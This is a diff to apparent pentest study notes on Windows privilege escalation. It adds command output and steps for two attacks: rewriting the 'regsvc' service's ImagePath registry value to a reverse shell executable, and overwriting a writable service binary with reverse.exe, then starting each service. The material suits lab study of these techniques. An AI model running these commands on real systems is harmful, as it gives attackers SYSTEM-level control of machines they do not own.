@@ -401,15 +401,64 @@ Sddl   : O:BAG:SYD:P(A;CI;KR;;;WD)(A;CI;KA;;;IU)(A;CI;KA;;;SY)(A;CI;KA;;;BA)(A;C
 ```bash
 # Alternatively accesschk.exe can be used to confirm:
 > .\accesschk.exe /accepteula -uvwqk HKLM\System\CurrentControlSet\Services\regsvc
+.\accesschk.exe /accepteula -uvwqk HKLM\System\CurrentControlSet\Services\regsvc
+HKLM\System\CurrentControlSet\Services\regsvc
+  Medium Mandatory Level (Default) [No-Write-Up]
+  RW NT AUTHORITY\SYSTEM
+        KEY_ALL_ACCESS
+  RW BUILTIN\Administrators
+        KEY_ALL_ACCESS
+  RW NT AUTHORITY\INTERACTIVE
+        KEY_ALL_ACCESS
 
-# Overwrite the ImagePath registry key to point to our reverse shell executable:
+
+# Query the register. 
+reg query HKLM\SYSTEM\CurrentControlSet\services\regsvc 
+
+reg query HKLM\SYSTEM\CurrentControlSet\services\regsvc 
+
+HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\services\regsvc
+    Type    REG_DWORD    0x10
+    Start    REG_DWORD    0x3
+    ErrorControl    REG_DWORD    0x1
+    ImagePath    REG_EXPAND_SZ    "C:\Program Files\Insecure Registry Service\insecureregistryservice.exe"
+    DisplayName    REG_SZ    Insecure Registry Service
+    ObjectName    REG_SZ    LocalSystem
+
+HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\services\regsvc\Security
+
+# Overwrite the ImagePath registry key to point to our reverse shell executable.
 > reg add HKLM\SYSTEM\CurrentControlSet\services\regsvc /v ImagePath /t REG_EXPAND_SZ /d
 C:\PrivEsc\reverse.exe /f
 
+#This has same effect as chaning the bin path of the service. 
 #Start a listener on Kali, and then start the service to trigger the exploit:
 > net start regsvc
 ```
 
+## Insecure Service Executables
+
+If the original service executable is modifiable by our user, we can simply replace it with our reverse shell executable. Remember to create a backup of the original executable if you are exploiting this in a real system
+
+###Privilege Escalation
+```bash
+Run winPEAS to check for service misconfigurations:
+> .\winPEASany.exe quiet servicesinfo
+2. Note that the “filepermsvc” service has an executable which appears to be
+writable by everyone. We can confirm this with accesschk.exe:
+> .\accesschk.exe /accepteula -quvw "C:\Program
+Files\File Permissions Service\filepermservice.exe"
+3. Create a backup of the original service executable:
+> copy "C:\Program Files\File Permissions
+Service\filepermservice.exe" C:\Temp 
+Copy the reverse shell executable to overwrite the service
+executable:
+> copy /Y C:\PrivEsc\reverse.exe "C:\Program
+Files\File Permissions
+Service\filepermservice.exe"
+5. Start a listener on Kali, and then start the service to trigger the
+exploit:
+> net start filepermsvc
 ### Iperius Backup 6.1.0 - Privilege Escalation
 Scenario: On a VNC accessible machine this service is running. Use the exploit [46863](https://www.exploit-db.com/exploits/46863) in exploitdb.
 
